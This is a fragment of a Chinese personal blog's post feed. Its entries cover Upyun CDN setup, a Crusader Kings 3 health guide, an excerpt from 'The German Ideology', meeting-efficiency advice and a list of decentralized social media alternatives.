    </entry>
    
    
    
    <entry>
      <title>记又拍云CDN使用</title>
      <link href="/77.html"/>
      <url>/77.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p></blockquote><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h3 id="1、进入控制台，点击CDN下方的立刻使用"><a href="#1、进入控制台，点击CDN下方的立刻使用" class="headerlink" title="1、进入控制台，点击CDN下方的立刻使用"></a>1、进入控制台，点击CDN下方的立刻使用</h3><p><img src="https://cos.gjcloak.xyz/file/image-1652086770318.png" alt="image-1652086770318" title="image-1652086770318"></p><h3 id="2、创建服务"><a href="#2、创建服务" class="headerlink" title="2、创建服务"></a>2、创建服务</h3><p><img src="https://cos.gjcloak.xyz/file/image-1652086919448.png" alt="image-1652086919448" title="image-1652086919448"></p><p><strong>服务名称</strong>：必须为英文</p><p><strong>加速域名</strong>：填写网站域名，不用加http或者https</p><p><strong>应用场景</strong>：选择全站加速</p><p><strong>回源协议</strong>：https</p><p><strong>源站证书校验</strong>：开启</p><p><strong>线路配置</strong>：地址服务器公网IP</p><p><strong>端口</strong>：默认443</p><p><strong>加速区域</strong>：默认国内</p><h3 id="3、点击创建成功会分配CNAME解析地址"><a href="#3、点击创建成功会分配CNAME解析地址" class="headerlink" title="3、点击创建成功会分配CNAME解析地址"></a>3、点击创建成功会分配CNAME解析地址</h3><p>前往腾讯云的域名解析处（如果是阿里或者其他的就去对应你购入域名的平台）添加解析记录。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652087698566.png" alt="image-1652087698566" title="image-1652087698566"></p><p><strong>主机记录</strong>：域名前缀</p><p><strong>记录类型</strong>：CNAME</p><p><strong>线路类型</strong>：默认</p><p><strong>记录值</strong>：分配的CNAME地址</p><p><strong>TTL</strong>：600（默认）</p><h3 id="4、验证"><a href="#4、验证" class="headerlink" title="4、验证"></a>4、验证</h3><p>配置完成等10分钟生效后，本地电脑打开cmd，ping网站域名指向到的不是你原来的源站ip以及原域名，即算解析成功！</p><p><img src="https://cos.gjcloak.xyz/file/image-1652087442139.png" alt="image-1652087442139" title="image-1652087442139"></p><h3 id="5、设置SSL"><a href="#5、设置SSL" class="headerlink" title="5、设置SSL"></a>5、设置SSL</h3><p><img src="https://cos.gjcloak.xyz/file/image-1652087543099.png" alt="image-1652087543099" title="image-1652087543099"></p><p>添加自有证书，就需要把key和pem填入</p><p><img src="https://cos.gjcloak.xyz/file/image-1652087589731.png" alt="image-1652087589731" title="image-1652087589731"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>CDN详细配置下面大佬的文章有详细说明，我这里只是针对自己配置时做个简单记录，以便后期回顾</p><h1 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h1><p><a href="https://www.mrgod.cn/208.html">又拍云CDN详细设置教程-正确使用推荐方法</a></p><p><a href="https://www.llh1347.com/archives/2022326.html">?halo博客:如何用又拍云搭建加速CDN</a></p><p><a href="https://help.upyun.com/knowledge-base/cdn-quick-start/">又拍云官方配置文档</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN </tag>
            
            <tag> 加速 </tag>
            
            <tag> 又拍云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>延年益寿指南</title>
      <link href="/b5a11ac0.html"/>
      <url>/b5a11ac0.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一篇教您如何活得长久活得健康的指南</p></blockquote><h3 id="影响健康的各类因素"><a href="#影响健康的各类因素" class="headerlink" title="影响健康的各类因素"></a>影响健康的各类因素</h3><p>根据维基可知，角色自25岁起，每年生日后一天都会有一定概率减少0.125的健康值，概率从7.5%起每年增加2.2%。毕竟凡人皆有一死。<br>（多产及血脉传承第五格可增加预期寿命，似乎起到的效果是减少每次因年龄增长导致的健康值减少，还有待验证）</p><p>但通过各类事件的修正，可以永久或在一段时间内增加健康值以抵消衰老带来的影响。</p><h3 id="事件及影响"><a href="#事件及影响" class="headerlink" title="事件及影响"></a>事件及影响</h3><p>以下列举一下个人通过实际体验统计出来的事件及影响，并非通过游戏文件直接查询因此肯定会有遗漏，会不定期的补充更新。<br>（只统计增加健康值的修正，疾病抵抗力只抵消惩罚因而不进行统计）</p><ol><li><p>宗族获得强大的血脉修正，全族所有人增加0.25健康，持续终身；</p></li><li><p>拥有海格力斯特质，增加0.75至1之间的健康，持续终身；</p></li><li><p>拥有纯血特质，增加小于0.25的健康，持续终身；</p></li><li><p>拥有节制特质，可获得增加小于0.25的健康修正，持续终身；</p></li><li><p>选择学识线医学重心，可获得增加小于0.25的健康修正，持续到改变重心为止；</p></li><li><p>学识线左线，第八技能点心裨体健，可增加0.25至0.5之间的健康，持续终身；</p></li><li><p>学识线左线，第九技能点身心俱悉，可增加0.25至0.5之间的健康，持续终身；</p></li><li><p>获得健身特质，可获得增加小于0.25的健康修正，持续终身；</p></li><li><p>获得强壮特质，可获得增加0.25至0.5之间的健康修正，持续终身；</p></li><li><p>随机事件神启，选择选项一，可获得精力充沛修正，增加0.75至1之间的健康，持续10年（本事件第二次触发后不再有增加健康的选项）；</p></li><li><p>在有情人在宫廷中的前提下打猎有几率发生新鲜空气与“操练”事件，增加1健康，持续5年；</p></li><li><p>在有朋友参加宴会的前提下，主持宴会有概率发生重燃友谊事件，增加1健康，持续5年；</p></li><li><p>在有朋友参加宴会的前提下，主持宴会有概率发生重燃热情事件，增加0.5健康，持续5年；</p></li><li><p>主持宴会有概率随机发生开心一刻事件，增加0.5健康，持续5年；</p></li><li><p>在有情人参加宴会的前提下，主持宴会有概率发生偷食禁果事件，增加0.25健康，持续5年；</p></li><li><p>参加宴会有概率随机发生飨宴事件，增加1健康，持续5年；</p></li><li><p>勾引具有忠贞或害羞特质的对象时，有概率在一阶段事件触发矜持之下事件，选择第二选项，如成功，可获得勾引的尝试令人稳健修正，增加0.25至0.5之间的健康，持续10年；</p></li><li><p>拥有宠物猫，可获得捕鼠猫增益，增加0.25至0.5之间的健康，持续直到猫死亡；</p></li><li><p>拥有宠物猫后，会有概率随机发生天下无鼠事件，增加0.75至1之间的健康，持续5年；<br>（重燃友谊及重燃热情修正似乎是互斥的，不会同时存在，且重燃友谊似乎无法连续两次宴会触发）</p></li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>因此通过不断刷新朝会&#x2F;宴会&#x2F;打猎事件可循环增加至少5.5的健康值，在没有发生生病&#x2F;精神错乱&#x2F;受伤等各种减少健康值的事件的情况下，可保证角色至少维持在身心无碍的健康状态，逻辑上存在活到150岁的可能。</p><p>另外，最新版本部分宝物也提供健康修正，目前发现的药物，书本，饰品，皆可能提供增加小于0.25的健康修正，只要装备&#x2F;展出即生效。</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CK3 </tag>
            
            <tag> 十字军之王3 </tag>
            
            <tag> 思路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书摘|《德意志意识形态》第一节第二部分 一般意识形态，特别是德国哲学</title>
      <link href="/76.html"/>
      <url>/76.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>此书是1932年发行，系统阐述了历史唯物主义的基本原理，如社会存在决定社会意识、生产方式在社会生活中起决定作用、生产关系必须适合生产力的发展等。进一步发展了《神圣家族》和《关于费尔巴哈的提纲》的天才思想，第一次系统地阐述了唯物史观的基本原理，完成了自《神圣家族》开始的对青年黑格尔派和费尔巴哈人本主义的批判，同时也标志着马克思恩格斯完成了对自己从前的哲学信仰的清算，标志着马克思主义哲学已经成熟</p></blockquote><p>我们开始要谈的前提不是任意提出的，不是教条，而是一些只有在想象中才能撇开的现实前提。这是一些现实的个人，是他们的活动和他们的物质生活条件，包括他们已有的和由他们自己的活动创造出来的物质生活条件。因此，这些前提可以用纯粹经验的方法来确认。</p><p>全部人类历史的第一个前提无疑是有生命的个人的存在。因此，第一个需要确认的事实就是这些个人的肉体组织以及由此产生的个人对其他自然的关系。当然，我们在这里既不能深入研究人们自身的生理特性，也不能深入研究人们所处的各种自然条件——地质条件、山岳水文地理条件、气候条件以及其他条件。任何历史记载都应当从这些自然基础以及它们在历史进程中由于人们的活动而发生的变更出发。</p><p>可以根据意识、宗教或随便别的什么来区别人和动物。一当人开始生产自己的生活资料的时候，这一步是由他们的肉体组织所决定的，人本身就开始把自 己和动物区别开来。人们生产自己的生活资料，同时间接地生产着自己的物质生活本身。</p><p>人们用以生产自己的生活资料的方式，首先取决于他们已有的和需要再生产的生活资料本身的特性。这种生产方式不应当只从它是个人肉体存在的再生产这方面加以考察。它在更大程度上是这些个人的一定的活动方式，是他们表现自己生活的一定方式、他们的一定的生活方式。个人怎样表现自己的生活，他们自己就是怎样。因此，他们是什么样的，这同他们的生产是一致的——既和他们生 产什么一致，又和他们怎样生产一致。因而，个人是什么样的，这取决于他们进行生产的物质条件。</p><p>这种生产第一次是随着人口的增长而开始的。而生产本身又是以个人彼此之间的交往［Verkehr］为前提的。这种交往的形式又是由生产决定的。</p><p>各民族之间的相互关系取决于每一个民族的生产力、分工和内部交往的发展程度。这个原理是公认的。然而不仅一个民族与其他民族的关系，而且这个民族本身的整个内部结构也取决于自己的生产以及自己内部和外部的交往的发展程度。一个民族的生产力发展的水平，最明显地表现于该民族分工的发展程度。任何新的生产力，只要它不是迄今已知的生产力单纯的量的扩大(例如，开垦土地)，都会引起分工的进一步发展。</p><p>一个民族内部的分工，首先引起工商业劳动同农业劳动的分离，从而也引起 城乡的分离和城乡利益的对立。分工的进一步发展导致商业劳动同工业劳动的分离。同时，由于这些不同部门内部的分工，共同从事某种劳动的个人之间又形成不同的分工。这种种分工的相互关系取决于农业劳动、工业劳动和商业劳动 的经营方式(父权制、奴隶制、等级、阶级)。在交往比较发达的条件下，同样的 情况也会在各民族间的相互关系中出现。</p><p>分工发展的各个不同阶段，同时也就是所有制的各种不同形式。这就是说，分工的每一个阶段还决定个人的与劳动材料、劳动工具和劳动产品有关的相互关系。</p><p>第一种所有制形式是部落［Stamm］所有制。它与生产的不发达阶段相适应，当时人们靠狩猎、捕鱼、牧畜，或者最多靠耕作为生。在后一种情况下，它是以有大量未开垦的土地为前提的。在这个阶段，分工还很不发达，仅限于家庭中现有的自然形成的分工的进一步扩大。因此，社会结构只限于家庭的扩大：父权制的部落首领，他们管辖的部落成员，最后是奴隶。潜在于家庭中的奴隶制，是随着人口和需求的增长，随着战争和交易这种外部交往的扩大而逐渐发展起来的。</p><p>第二种所有制形式是古典古代的公社所有制和国家所有制。这种所有制是由于几个部落通过契约或征服联合为一个城市而产生的。在这种所有制下仍然保存着奴隶制。除公社所有制以外，动产私有制以及后来的不动产私有制已经发展起来，但它们是作为一种反常的、从属于公社所有制的形式发展起来的。公民仅仅共同享有支配自己那些做工的奴隶的权力，因此受公社所有制形式的约束。这是积极公民的一种共同私有制，他们面对着奴隶不得不保存这种自然形成的联 合方式。因此，建筑在这个基础上的整个社会结构，以及与此相联系的人民权力，随着私有制，特别是不动产私有制的发展而逐渐趋向衰落。分工已经比较发达。城乡之间的对立已经产生，后来，一些代表城市利益的国家同另一些代表乡村利益的国家之间的对立出现了。在城市内部存在着工业和海外贸易之间的对立。公民和奴隶之间的阶级关系已经充分发展。</p><p>随着私有制的发展，这里第一次出现了这样的关系，这些关系我们在考察现 代私有制时还会遇见，不过规模更为巨大而已。一方面是私有财产的集中，这种集中在罗马很早就开始了(李奇尼乌斯土地法就是证明)，从内战发生以来，尤其是在王政时期，发展得非常迅速；另一方面是由此而来的平民小农向无产阶级的转化，然而，后者由于处于有产者公民和奴隶之间的中间地位，并未获得独立的发展。</p><p>第三种形式是封建的或等级的所有制。古代的起点是城市及其狭小的领域，中世纪的起点则是乡村。地旷人稀，居住分散，而征服者也没有使人口大量增加，这种情况决定了起点有这样的变化。因此，与希腊和罗马相反，封建制度的 发展是在一个宽广得多的、由罗马的征服以及起初就同征服联系在一起的农业的普及所准备好了的地域中开始的。趋于衰落的罗马帝国的最后几个世纪和蛮 族对它的征服本身，使得生产力遭到了极大的破坏；农业衰落了，工业由于缺乏 销路而一蹶不振，商业停滞或被迫中断，城乡居民减少了。这些情况以及受其制 约的进行征服的组织方式，在日耳曼人的军事制度的影响下，发展了封建所有制。这种所有制像部落所有制和公社所有制一样，也是以一种共同体［Gemeinwe－sen］为基础的。但是作为直接进行生产的阶级而与这种共同体 对立的，已经不是与古典古代的共同体相对立的奴隶，而是小农奴。随着封建制度的充分发展，也产生了与城市对立的现象。土地占有的等级结构以及与此相联系的武装扈从制度使贵族掌握了支配农奴的权力。这种封建结构同古典古代的公社所有制一样，是一种联合，其目的在于对付被统治的生产者阶级；只是联合的形式和对于直接生产者的关系有所不同，因为出现了不同的生产条件。</p><p>在城市中与这种土地占有的封建结构相适应的是同业公会所有制，即手工业 的封建组织。在这里财产主要在于个人的劳动。联合起来反对成群搭伙的掠夺 成性的贵族的必要性，在实业家同时又是商人的时期对公共商场的需要，流入当时繁华城市的逃亡农奴的竞争的加剧，全国的封建结构，所有这一切产生了行会；个别手工业者逐渐积蓄起少量资本，而且在人口不断增长的情况下他们的 人数没有什么变动，这就使得帮工制度和学徒制度发展起来，而这种制度在城市里产生了一种和农村等级制相似的等级制。</p><p>这样，封建时代的所有制的主要形式，一方面是土地所有制和束缚于土地所有制的农奴劳动，另一方面是拥有少量资本并支配着帮工劳动的自身劳动。这两种所有制的结构都是由狭隘的生产关系——小规模的粗陋的土地耕作和手工业式的工业决定的。在封建制度的繁荣时代，分工是很少的。每一个国家都存在着城乡之间的对立；等级结构固然表现得非常鲜明，但是除了在乡村里有王 公、贵族、僧侣和农民的划分，在城市里有师傅、帮工、学徒以及后来的平民短 工的划分之外，就再没有什么大的分工了。在农业中，分工因土地的小块耕作而 受到阻碍，与这种耕作方式同时产生的还有农民自己的家庭工业；在工业中，各 业手工业内部根本没有实行分工，而各业手工业之间的分工也是非常少的。在比较老的城市中，工业和商业早就分工了；而在比较新的城市中，只是在后来当这些城市彼此发生了关系的时候，这样的分工才发展起来。</p><p>比较广大的地区联合为封建王国，无论对于土地贵族或城市来说，都是一种需要。因此，统治阶级的组织即贵族的组织到处都在君主的领导之下。</p><p>由此可见，事情是这样的：以一定的方式进行生产活动的一定的个人，发生一定的社会关系和政治关系。经验的观察在任何情况下都应当根据经验来揭示社会结构和政治结构同生产的联系，而不应当带有任何神秘和思辨的色彩。社会结构和国家总是从一定的个人的生活过程中产生的。但是，这里所说的个人不是他们自己或别人想象中的那种个人，而是现实中的个人，也就是说，这些个人是从事活动的，进行物质生产的，因而是在一定的物质的、不受他们任意支配的界限、前提和条件下活动着的。</p><p>思想、观念、意识的生产最初是直接与人们的物质活动，与人们的物质交往，与现实生活的语言交织在一起的。人们的想象、思维、精神交往在这里还是人们物质行动的直接产物。表现在某一民族的政治、法律、道德、宗教、形而上学等的语言中的精神生产也是这样。人们是自己的观念、思想等等的生产者， 但这里所说的人们是现实的、从事活动的人们，他们受自己的生产力和与之 相适应的交往的一定发展——直到交往的最遥远的形态——所制约。意识［das Bewuβtsein］在任何时候都只能是被意识到了的存在［das bewuβte Sein］， 而人们的存在就是他们的现实生活过程。如果在全部意识形态中，人们和他们的 关系就像在照相机中一样是倒立呈像的，那么这种现象也是从人们生活的历史过 程中产生的，正如物体在视网膜上的倒影是直接从人们生活的生理过程中产生的 一样。</p><p>德国哲学从天国降到人间；和它完全相反，这里我们是从人间升到天国。这就是说，我们不是从人们所说的、所设想的、所想象的东西出发，也不是从口头说的、思考出来的、设想出来的、想象出来的人出发，去理解有血有肉的人。我们的出发点是从事实际活动的人，而且从他们的现实生活过程中还可以描绘出这一生活过程在意识形态上的反射和反响的发展。甚至人们头脑中的模糊幻象也 是他们的可以通过经验来确认的、与物质前提相联系的物质生活过程的必然升华物。因此，道德、宗教、形而上学和其他意识形态，以及与它们相适应的意识形式便不再保留独立性的外观了。它们没有历史，没有发展，而发展着自己的物 质生产和物质交往的人们，在改变自己的这个现实的同时也改变着自己的思维和思维的产物。不是意识决定生活，而是生活决定意识。前一种考察方法从意识出发，把意识看作是有生命的个人。后一种符合现实生活的考察方法则从现实的、 有生命的个人本身出发，把意识仅仅看作是他们的意识。</p><p>这种考察方法不是没有前提的。它从现实的前提出发，它一刻也不离开这种前提。它的前提是人，但不是处在某种虚幻的离群索居和固定不变状态中的人，而是处在现实的、可以通过经验观察到的、在一定条件下进行的发展过程中的人。只要描绘出这个能动的生活过程，历史就不再像那些本身还是抽象的经验论者所认为的那样，是一些僵死的事实的汇集，也不再像唯心主义者所认为的那样，是想象的主体的想象活动。</p><p>在思辨终止的地方，在现实生活面前，正是描述人们实践活动和实际发展过程的真正的实证科学开始的地方。关于意识的空话将终止，它们一定会被真正的知识所代替。对现实的描述会使独立的哲学失去生存环境，能够取而代之的充其 量不过是从对人类历史发展的考察中抽象出来的最一般的结果的概括。这些抽象本身离开了现实的历史就没有任何价值。它们只能对整理历史资料提供某些 方便，指出历史资料的各个层次的顺序。但是这些抽象与哲学不同，它们绝不提供可以适用于各个历史时代的药方或公式。相反，只是在人们着手考察和整理资料——不管是有关过去时代的还是有关当代的资料——的时候，在实际阐述资料的时候，困难才开始出现。这些困难的排除受到种种前提的制约，这些前提在这 里是根本不可能提供出来的，而只能从对每个时代的个人的现实生活过程和活动的研究中产生。这里我们只举出几个我们用来与意识形态相对照的抽象，并用历史的例子来加以说明。</p><p>公爵注：如需阅读原著可以通过点击 <a href="https://cos.gjcloak.xyz/uploads/2022/04/26/%E5%BE%B7%E6%84%8F%E5%BF%97%E6%84%8F%E8%AF%86%E5%BD%A2%E6%80%81.pdf">德意志意识形态</a> 下载阅读</p>]]></content>
      
      
      <categories>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书摘 </tag>
            
            <tag> 德意志意识形态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让会议更高效？</title>
      <link href="/75.html"/>
      <url>/75.html</url>
      
        <content type="html"><![CDATA[<p>规模越大的公司，会议越多。职位越高的人大部分工作时间都是在开会中度过，甚至是开会开到没时间工作。但这并不意味着开会是有价值的。</p><p>如果开会不能产生价值，它就没有意义， 我称之为“虚假繁忙”。</p><h1 id="会议必须解决问题"><a href="#会议必须解决问题" class="headerlink" title="会议必须解决问题"></a>会议必须解决问题</h1><p>一定要明确，<strong>会议不是拿来讨论问题的，会议必须拿来解决问题</strong>。</p><p>如果你有了解决方案，希望大家表达意见可以开，方案确定以后要通知大家也可以开，除此之外不需要开会。开会是达成共识，而不是讨论问题，因为开会讨论问题不会有结果。</p><p>因此，会议必须要有一个很明确的主题，而且所有围绕这个主题的资料要提前准备，没有准备的会议就不要开，这是一个非常明确的要求。</p><p>如果这个方法论不做好的话，公司的整个效率都会低下。<strong>会议的工作方法决定公司两件事情，一个是效率，一个是品质</strong>。工作效率和工作品质就由会议方法论决定，一定不要小看这个会议的方法论。</p><h1 id="会议由项目负责人主持"><a href="#会议由项目负责人主持" class="headerlink" title="会议由项目负责人主持"></a>会议由项目负责人主持</h1><p>开会谁来做主持人？一般来说<strong>解决问题的负责人来做主持人</strong>，因为只有他才会想尽办法让这个会议有结果。如果不是对这个问题负责的人来主持，他就按流程把会议主持完，但是他绝对不关心会议的结果。这在方法论上是一个极大的错误。</p><p>很多公司开会很喜欢让老板来主持，我建议除了战略会之外，老板都不要主持，因为<strong>只有战略会是老板的责任，其他会都是别人的责任，应该让别人去做</strong>。比如说产品会、经营会，其实都不需要老板主持，就应该是那个主负责人去主持。</p><h1 id="明确4个时间"><a href="#明确4个时间" class="headerlink" title="明确4个时间"></a>明确4个时间</h1><p>会议的所有时间要约定下来，这包括4个时间：</p><ul><li>开始和结束的时间。</li><li>发言的时间。</li><li>与会者决议达成共识的时间。</li><li>行动方案确认的时间。</li></ul><p>我最怕大家开工作会议就是只出一个决定，这样远远不够，一定要把行动方案也确定下来，就是做什么不做什么，都要确定下来。</p><p>还有一个特别请大家注意的，日常工作中，<strong>一个有效的会议最长就是40分钟。</strong></p><p>很多公司最喜欢开的都是几个小时的会，什么时候开那么长的会议，一个是战略会议，战略会议一般会封闭两三天，另一个就是半年度会议或者是年度会议。除此之外，<strong>日常会议都不要超过40分钟</strong>。</p><p>为什么要这么短？</p><p>两个原因，第一个原因就是来开会的人基本上都在重要岗位，开得越长，公司的成本越高。第二个原因就是<strong>解决问题的会议跟时间长度没关系，跟前期准备有关系</strong>。前期准备得越充分，会议效率就会越高，所以日常会议一定要短。</p><h1 id="开会的核心是谈行动方案"><a href="#开会的核心是谈行动方案" class="headerlink" title="开会的核心是谈行动方案"></a>开会的核心是谈行动方案</h1><p>开会的目的是要解决具体问题。因此，开会的核心主要是谈行动方案，不是谈观点，也不是谈问题。</p><p>我们在管理工作中遇到最大的问题是，大家陷在问题里。如果你仔细观察，会发现很多公司的会议都是问题导向的——只要有问题，就召开会议，也正因为如此，企业内部的会议非常多，另外，问题层出不穷。</p><p>正确的做法是，<strong>会议是行动方案导向的，也就是有问题不需要开会，而是明确行动方案才开会</strong>。有解决方案希望大家表达意见可以开，方案确定以后要通知大家也可以开，除此之外不需要开会，所有对问题的讨论都在会后做。</p><p><strong>开会是达成共识，而不是讨论问题</strong>。因为讨论问题的会议往往很难达成共识，同时会耗费时间，需要多人参与，这对解决问题而言，不是最好的解决方式。</p><p>要知道，<strong>理解和判断问题应该是回到问题发生地，而不是在会议室</strong>。所以会议对于问题而言，不是最好的解决路径。</p><h1 id="会议要得出结论"><a href="#会议要得出结论" class="headerlink" title="会议要得出结论"></a>会议要得出结论</h1><p><strong>会议开完了，一定要下结论</strong>。如果议而不决，甚至经常无法把会议进行下去，经常跑题，经常争论并坚持各自的见解，恐怕就无法进行有效的决策了。我建议大家调整成这个样子：日常会议开完，大家都清楚要做什么，然后就去做了。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 会议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9个去中心化、端到端、开源的主流社交媒体平台替代品</title>
      <link href="/7e2c0211.html"/>
      <url>/7e2c0211.html</url>
      
        <content type="html"><![CDATA[<p>你多半知道，Facebook 因可能从它的“端到端加密”的聊天服务 WhatsApp 那里共享用户数据而 遭到抨击。</p><p>这些有争议的隐私政策变化使无数人转而使用 WhatsApp 替代品。</p><p>注重隐私的人们，早就料到了会有这事。毕竟，Facebook 可是花了 190 亿美元 收购了 WhatsApp 这样的手机应用，而当时靠它还赚不到什么钱。现在，Facebook 该回本了 —— 回那之前投进去的 190 亿美元的本。他们可能打算把你的数据共享给广告商，这样的话，你看到的广告就会更加个性化（侵入性）了。</p><p>要是你受够了 Facebook、Google、Twitter 等科技公司的“我说了算”的态度，那你应该试试一些社交媒体平台的替代品。</p><p>这些社交平台的替代品都是开源的，它们都用了端到端或区块链技术来实现去中心化，而且你可能能够自己托管其中一些平台。</p><p>{cat_tips_A}先说句实话，这些替代平台的体验，可能会和你惯用平台的体验有所差异，但这些平台是不会侵犯你的隐私和言论自由的。这就是一种权衡{&#x2F;cat_tips_A}</p><h1 id="Minds"><a href="#Minds" class="headerlink" title="Minds"></a>Minds</h1><ul><li>用于替代：Facebook 和 YouTube</li><li>特点：代码开源、区块链</li><li>自托管：否</li></ul><p>在 Minds 上，你可以发视频、博客、图片，并设置当前状态。你也能向群聊，或者直接向好友，安全地发送消息或者进行视频聊天。通过热门内容和话题，你可以发现你感兴趣的文章。</p><p>还不止这些。你还能通过做贡献来赚取代币，这些代币可以用来升级你的频道。创作者可以从粉丝那里直接得到美元、比特币和以太坊的支付。</p><h1 id="Aether"><a href="#Aether" class="headerlink" title="Aether"></a>Aether</h1><ul><li>用于替代：Reddit</li><li>特点：开源、端到端</li><li>自托管：否</li></ul><p>Aether 是一个开源、端到端的平台，用于创建自我管理的社区，并可以审查管理记录以及选举版主。</p><p>Aether 上的内容，具有存在时间短的性质，并且内容只会留存六个月，除非有人把它保存下来。因为它是端到端的，所以中心服务器不复存在。</p><p>Aether 有趣的一点在于它的民主社区。社区可以选举版主，也能投票弹劾版主。</p><h1 id="Mastodon"><a href="#Mastodon" class="headerlink" title="Mastodon"></a>Mastodon</h1><ul><li>用于替代：Twitter</li><li>特点：开源、去中心化</li><li>自托管：是</li></ul><p>在自由开源软件爱好者中，Mastodon已经很有名了。我们之前报道过 Twitter 的开源替代品 Mastodon，并且 你也可以在 Mastodon 上关注我们。</p><p>Mastdon 并不像 Twitter 那样是一个单一网站，它是个由数千个社区组成的网络，这些社区都由不同的组织和个人运营，并且都提供无缝的社交媒体体验。这被称之为“Fediverse”。</p><p>你可以托管自己的 Mastodon 实例，并选择将其连接到其他 Mastodon 实例，或者直接加入一个已有的 Mastodon 实例，比如说 Mastodon Social。</p><h1 id="LBRY"><a href="#LBRY" class="headerlink" title="LBRY"></a>LBRY</h1><ul><li>用于替代：YouTube</li><li>特点：开源、去中心化、区块链</li><li>自托管：否</li></ul><p>LBRY的核心是一个基于区块链的去中心化协议。协议顶层，便是由其加密货币驱动的数字市场。</p><p>通过 LBRY，创作者可以提供多种数字化内容，例如影片、书籍和游戏。基本上，它是作为 YouTube 的替代而受到推崇的。你可以在 Odysee 上访问这个视频共享平台。</p><h1 id="Pixelfed"><a href="#Pixelfed" class="headerlink" title="Pixelfed"></a>Pixelfed</h1><ul><li>用于替代：Instagram</li><li>特点：去中心化、区块链</li><li>自托管：否</li></ul><p>Pixelfed 和 Mastodon 使用了相同的底层开放协议，即 ActivityPub。</p><p>因此，你也可以通过 Pixelfed 与 Mastodon 的实例进行互动。我还没有试过，但从理论上讲，你应该可以做到这一点。你应该找到几个活跃的 Pixelfed 实例来注册。</p><p>如果你想控制你的数据和隐私，Pixelfed 是 Instagram 的一个简单替代品。你可以控制你的图片的隐私，在平台上没有任何广告。</p><p>你可以得到与照片分享平台基本相同的功能。然而，它没有驱动时间线的算法，遵循时间顺序，不收集你的任何数据，以获得个性化的体验。</p><h1 id="Peertube"><a href="#Peertube" class="headerlink" title="Peertube"></a>Peertube</h1><ul><li>用于替代：YouTube</li><li>特点：去中心化、端到端</li><li>自托管：否</li></ul><p>PeerTube 由法国公司 Framasoft 开发，它是一个去中心化的视频平台。PeerTube 使用了 BitTorrent 协议 以在用户之间共享宽带。</p><p>PeerTube 旨在抵制企业的垄断，它不依靠广告，并且也不会追踪你。不过要注意，你的 IP 地址在这里不是匿名的。</p><p>目前有许多 PeerTube 的实例，你可以在那里托管你的视频。有些实例需要付费，不过大多数都是免费的。</p><h1 id="Diaspora"><a href="#Diaspora" class="headerlink" title="Diaspora"></a>Diaspora</h1><ul><li>用于替代：Facebook</li><li>特点：去中心化、开源</li><li>自托管：是</li></ul><p>Diaspora 是最早的去中心化社交网络之一。最早可以追溯到 2010 年，当时 Diaspora 就作为 Facebook 的替代品而受到吹捧。最初几年，它确实得到了一些应得的关注，但它只在小众范围内得到了使用。</p><p>和 Mastodon 类似，Diaspora 由许多“豆荚pod” （节点服务器）组成。你可以在一个“豆荚”上注册，或者托管你自己的“豆荚”。科技公司无法拥有你的数据，只有你可以。</p><h1 id="Dtube"><a href="#Dtube" class="headerlink" title="Dtube"></a>Dtube</h1><ul><li>用于替代：YouTube</li><li>特点：去中心化、区块链</li><li>自托管：否</li></ul><p>Dtube 是一个基于区块链的去中心化 YouTube 复制品。之所以说它是 YouTube 复制品，是因为它界面太像 YouTube 了。</p><p>Dtube 像其他基于区块链的社交媒体一样，是由 DTube 币（DTC）驱动的。每当有人观看创作者的视频或者与之互动，创作者就会获得 DTC。这些硬币可以用于推广内容，或者通过合作的加密货币交换方来提现。</p><h1 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h1><ul><li>用于替代：WhatsApp、Facebook Messenger</li><li>特点：开源</li><li>自托管：否</li></ul><p>与端到端加密的 WhatsApp 聊天不同，Signal 不会跟踪你，不会共享你的数据，也不会侵犯你的隐私。</p><p>Signal 一举成名，是在它得到 Edward Snowden 的认可之时。而当 WhatsApp 开始与 Facebook 共享数据时，Elon Musk 又发了关于 Signal 的推文，这便让 Signal 更受瞩目了。</p><p>Signal 使用了自己的开源 Signal 协议，以提供端到端加密的消息和通话服务。</p><h1 id="KARMA（已终止）"><a href="#KARMA（已终止）" class="headerlink" title="KARMA（已终止）"></a>KARMA（已终止）</h1><ul><li>用于替代：Instagram</li><li>特点：去中心化、区块链</li><li>自托管：否</li></ul><p>这也是一个基于区块链的社交网络，由加密货币驱动。</p><p>KARMA 是 Instagram 的一个复制品，它构建于开源区块链平台 EOSIO之上。每当你的内容获得了点赞和分享，你就会得到 KARMA 代币。你可以用这些代币来推广你的内容，或者通过一个合作的加密货币交换方，来将其转换为现实货币。</p><p>KARMA 只能在手机上使用，可以在 Play Store 及 App Store 上获取。</p><p># 还有别的吗?</p><p>还有一些其他的服务，它们虽然不是开源或者去中心化的，但也尊重你的隐私与言论自由。</p><p>MeWe：Facebook 替代品</p><p>Voice：NFT 为数字艺术家赋能</p><p>ProtonMail：Gmail 替代品</p><p>还有一个基于 Matrix 协议的 Element 聊天工具，你也可以试试。</p><p>我知道，应该还有几个别的社交媒体平台的替代品。也想分享一下？我可能会把他们加到列表中来。</p><p>要是你也得在这个列表中选一个平台，你想选哪个呢？</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
